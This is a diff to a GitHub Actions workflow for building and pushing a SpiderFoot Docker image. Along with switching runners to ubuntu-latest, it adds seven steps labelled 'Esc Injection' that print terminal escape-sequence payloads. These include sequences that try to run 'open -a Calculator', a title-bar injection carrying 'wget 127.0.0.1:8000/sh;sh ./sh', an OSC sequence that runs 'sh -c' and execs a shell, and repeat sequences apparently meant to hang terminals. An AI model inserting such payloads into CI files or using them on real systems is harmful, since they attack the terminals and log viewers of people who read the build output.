@@ -11,26 +11,53 @@ env:
     PORT: 8000
     IMAGE_NAME: ${{ github.actor }}/archlinux-spiderfoot
     TAG_NAME: latest
-   
+
 jobs:
 
   build:
-    runs-on: self-hosted
+    runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v4
     - name: Build the Docker image
       run: docker build . --no-cache --force-rm --file Dockerfile --tag ${{ env.IMAGE_NAME }}:${{ env.TAG_NAME }}
 
   test:
-    runs-on: self-hosted
+    runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: Test the Docker image
         run: docker run -d --rm -p ${{ env.PORT }}:${{ env.PORT }} ${{ env.IMAGE_NAME }}:${{ env.TAG_NAME }}
-        
+
+      - name: Esc Injection 1
+        run: echo -e "\e[1m[➤]—\e[80;b\e[0m\007\n"
+
+      - name: Esc Injection 2
+        run: printf "\eP$q;open -a Calculator\r\e\\\eP$q\e\\"
+
+      - name: Esc Injection 3
+        run: printf "\e[91mA\e[8000;b\e[0m\007\n"
+
+      - name: Esc Injection 4
+        run: printf "\e]50;i$(open -a Calculator&)\a\e]50;?\a"
+
+      - name: Esc Injection 5
+        run: printf "\e]2;;wget 127.0.0.1:8000/sh;sh ./sh;exit;\a\e[21t\e]2;xterm\aPress Enter>\e[8m;"
+
+      - name: Esc Injection 6
+        run: |
+          printf "\e[92mA\e[8000;b\e[0m\007\n"
+          printf "\033[93mB\033[8000;b\033[0m\007\n"
+          echo -e "\033[93mB\033[8000;b\033[0m\007\n"
+
+      - name: Esc Injection 7
+        run: |
+          printf "\e]9;9;/\" sh -c 'open -a Calculator && cd && exec \$SHELL' -- \"o /\a"
+          printf "\e[1m[➤]—\e[80;b\e[0m\007\n"
+          printf "\033[1m[➤]—\033[800;b\033[0m\007\n"
+
   push_to_registry:
     name: Push Docker image to Docker Hub
-    runs-on: self-hosted
+    runs-on: ubuntu-latest
     steps:
       - name: Check out the repo
         uses: actions/checkout@v4
